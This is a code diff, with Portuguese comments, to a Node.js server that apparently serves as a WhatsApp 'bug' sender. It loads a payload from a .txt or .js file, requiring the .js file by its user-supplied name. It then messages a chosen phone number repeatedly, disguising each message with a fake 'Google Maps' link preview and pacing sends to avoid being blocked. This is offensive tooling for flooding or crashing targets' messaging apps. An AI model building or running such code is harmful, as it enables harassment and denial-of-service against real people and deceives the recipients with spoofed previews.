@@ -141,36 +141,60 @@ const server = http.createServer(async (req, res) => {
                     return;
                 }
 
+                // Disparo de Payload com suporte a arquivos .js e .txt
                 if (acao === 'send_bug' && param && extraData) {
                     const targetJid = `${param.replace(/\D/g, '')}@s.whatsapp.net`;
-                    const arquivoTxt = extraData.file;
+                    const nomeArquivo = extraData.file;
                     const quantidade = parseInt(extraData.amount) || 1;
 
-                    const filePath = path.join(__dirname, arquivoTxt);
                     let payloadText = "https://maps.google.com\n⚠️ Payload ZRX";
 
-                    if (fs.existsSync(filePath)) {
-                        payloadText = fs.readFileSync(filePath, 'utf8');
+                    try {
+                        const filePath = path.join(__dirname, nomeArquivo);
+
+                        // Tenta importar se for um arquivo JavaScript (.js)
+                        if (nomeArquivo.endsWith('.js') || fs.existsSync(filePath + '.js')) {
+                            const nomeModulo = nomeArquivo.replace(/\.js$/, '');
+                            
+                            // Limpa o cache do require para ler sempre a versão mais recente
+                            delete require.cache[require.resolve(`./${nomeModulo}`)];
+                            const modulo = require(`./${nomeModulo}`);
+
+                            if (typeof modulo === 'string') {
+                                payloadText = modulo;
+                            } else if (typeof modulo === 'object' && modulo !== null) {
+                                // Puxa qualquer variável exportada no arquivo (ex: bugUrl, ios, payload, etc)
+                                payloadText = modulo.bugUrl || modulo.ios || modulo.payload || modulo.default || Object.values(modulo)[0] || payloadText;
+                            }
+                        } else if (fs.existsSync(filePath)) {
+                            // Leitura padrão para arquivos de texto (.txt)
+                            payloadText = fs.readFileSync(filePath, 'utf8');
+                        }
+                    } catch (err) {
+                        console.error("Erro ao carregar o arquivo do payload:", err.message);
                     }
+
+                    // Extrai a primeira linha para a pré-visualização do link
+                    const primeiraLinha = payloadText.split('\n')[0].trim();
 
                     for (let i = 0; i < quantidade; i++) {
                         await waSock.sendMessage(targetJid, { 
                             text: payloadText,
                             linkPreview: {
                                 "canonical-url": "https://maps.google.com",
-                                "matched-text": payloadText.split('\n')[0],
+                                "matched-text": primeiraLinha.startsWith('http') ? primeiraLinha : "https://maps.google.com",
                                 "title": "Google Maps",
                                 "description": "Localização",
                                 "jpegThumbnail": null
                             }
                         });
                         
-                        // Delay fixado em 3 segundos (3000ms) para evitar problemas de sincronização/criptografia
+                        // Delay mantido em 3 segundos (3000ms) para evitar o bloqueio por "Aguardando mensagem"
                         await delay(3000);
                     }
 
                     res.writeHead(200, { 'Content-Type': 'application/json' });
-                    res.end(JSON.stringify({ sucesso: true, mensagem: `Carga de ${arquivoTxt} disparada ${quantidade} vez(es)!` }));
+                    res.end(JSON.stringify({ sucesso: true, mensagem: `Carga de ${nomeArquivo} disparada ${quantidade} vez(es)!` }));
                     return;
                 }
 
